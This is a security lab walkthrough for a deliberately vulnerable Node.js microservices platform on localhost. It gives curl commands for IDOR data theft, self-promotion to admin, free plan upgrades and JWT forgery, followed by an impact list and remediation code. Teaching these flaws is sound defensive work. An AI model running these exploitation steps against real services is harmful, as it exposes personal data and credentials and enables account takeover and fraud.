# Lab 05 — CloudCorp Microservices Authorization Lab

## Overview
**Application:** CloudCorp SaaS Platform (Node.js Microservices)
**Target:** http://localhost:3000
**Vulnerability Class:** Broken Object Level Authorization (BOLA/IDOR) + Privilege Escalation

## Architecture
```
Internet → API Gateway (3000) → User Service    (3001)
                              → Project Service  (3002)
                              → File Service     (3003)
                              → Billing Service  (3004)
```

## Test Users
| Email | Password | Role | ID |
|-------|----------|------|----|
| alice@cloudcorp.com | Alice123! | user | 1 |
| bob@cloudcorp.com | Bob456! | user | 2 |
| admin@cloudcorp.com | Admin789! | admin | 3 |

---

## Step 1: Reconnaissance

Map all API endpoints by reviewing the lab UI and service code:

```bash
# Get all users (no auth check!)
curl http://localhost:3001/users

# Service health checks
curl http://localhost:3000/health
curl http://localhost:3001/health
curl http://localhost:3002/health
```

---

## Step 2: Threat Modeling

| Threat | Asset | Attack Vector | CVSS |
|--------|-------|--------------|------|
| IDOR | User PII (SSN, CC, API keys) | GET /users/:id with another user's ID | 8.6 High |
| Horizontal Privilege Escalation | User data integrity | PUT /users/:id as different user | 7.5 High |
| Vertical Privilege Escalation | Admin access | PUT /users/:id/role with role=admin | 9.1 Critical |
| IDOR | Confidential projects | GET /projects/:id not in membership | 7.4 High |
| IDOR | Private files | GET /files/3 (admin production keys) | 9.0 Critical |
| Billing Fraud | Service tier | PUT /billing/plan without payment | 6.5 Medium |
| JWT Tampering | Authentication | Modify JWT payload (no sig check) | 8.8 High |

---

## Step 3: Exploitation

### IDOR-001: Access Another User's Sensitive Data
```bash
# Login as Alice (user id=1)
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@cloudcorp.com","password":"Alice123!"}' | jq -r .token)

# Access Bob's profile (id=2) — should be forbidden but isn't
curl http://localhost:3000/api/users/2 \
  -H "Authorization: Bearer $TOKEN"
# Returns: Bob's name, email, SSN, credit card, API key, salary!

# Access Admin's profile (id=3)
curl http://localhost:3000/api/users/3 \
  -H "Authorization: Bearer $TOKEN"
# Returns: Admin's SUPER SECRET API key and credentials!
```

### AUTHZ-001: Horizontal Privilege Escalation
```bash
# Modify Bob's profile as Alice
curl -X PUT http://localhost:3000/api/users/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "Hacked by Alice", "address": "attacker controls this"}'
```

### AUTHZ-002: Vertical Privilege Escalation (User → Admin)
```bash
# Promote yourself to admin
curl -X PUT http://localhost:3000/api/users/1/role \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

### IDOR-002: Access Private Project Data
```bash
# Alice (member of project 1 only) accesses Project 2 (Bob's confidential project)
curl http://localhost:3000/api/projects/2 \
  -H "Authorization: Bearer $TOKEN"
# Returns: Bob's confidential project data
```

### IDOR-003: Download Admin's Production Keys
```bash
# Access file id=3 (admin's production credentials)
curl http://localhost:3000/api/files/3 \
  -H "Authorization: Bearer $TOKEN"
# Returns: AWS credentials, DB passwords, API keys!
```

### AUTHZ-004: Free Plan Upgrade
```bash
# Upgrade to Enterprise without payment
curl -X PUT http://localhost:3000/api/billing/plan \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan": "enterprise", "paymentMethod": null}'
# Returns: success with enterprise features at $0
```

### MSEC-002: JWT Tampering
```bash
# Decode the JWT
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Create a fake admin token (gateway uses jwt.decode not jwt.verify!)
FAKE_PAYLOAD=$(echo '{"userId":99,"id":99,"email":"hacker@evil.com","name":"HACKER","role":"admin","iat":1700000000,"exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
FAKE_HEADER=$(echo '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
FAKE_TOKEN="${FAKE_HEADER}.${FAKE_PAYLOAD}.fakesignature"

# Use the fake token to access admin endpoint
curl http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer $FAKE_TOKEN" \
  -H "X-Admin-Key: admin-secret-key"
```

---

## Step 4: Impact Assessment

- **Data breach:** All users' PII (SSN, credit cards, salaries) exfiltrated
- **Credential theft:** Admin API keys → full platform access
- **Financial fraud:** Free enterprise plan upgrades
- **Privilege escalation:** Any user can become admin
- **Data destruction:** Any user can delete any project/file
- **JWT forgery:** Authentication completely bypassed

---

## Step 5: Remediation

### Fix IDOR — Add Ownership Checks
```javascript
// VULNERABLE:
app.get('/users/:id', (req, res) => {
    const user = users.find(u => u.id === parseInt(req.params.id));
    res.json(user);
});

// SECURE:
app.get('/users/:id', (req, res) => {
    const requestedId = parseInt(req.params.id);
    const requesterId = parseInt(req.headers['x-user-id']);
    const requesterRole = req.headers['x-user-role'];

    // Only allow access to own data or if admin
    if (requestedId !== requesterId && requesterRole !== 'admin') {
        return res.status(403).json({ error: 'Access denied' });
    }
    const user = users.find(u => u.id === requestedId);
    // Also scrub sensitive fields for non-admin:
    const { ssn, creditCard, salary, ...safeUser } = user;
    res.json(requesterRole === 'admin' ? user : safeUser);
});
```

### Fix JWT Verification
```javascript
// VULNERABLE: jwt.decode() - no signature check
const decoded = jwt.decode(token);

// SECURE: jwt.verify() - validates signature
const decoded = jwt.verify(token, JWT_SECRET);  // throws if invalid
```

### Fix Privilege Escalation
```javascript
// Only admins can change roles, and only to non-admin roles (unless super-admin)
app.put('/users/:id/role', (req, res) => {
    const requesterRole = req.headers['x-user-role'];
    if (requesterRole !== 'admin') {
        return res.status(403).json({ error: 'Admin role required to change roles' });
    }
    // Additional check: prevent privilege escalation to admin via API
    if (req.body.role === 'admin' && requesterRole !== 'super-admin') {
        return res.status(403).json({ error: 'Cannot grant admin role' });
    }
    // proceed...
});
```
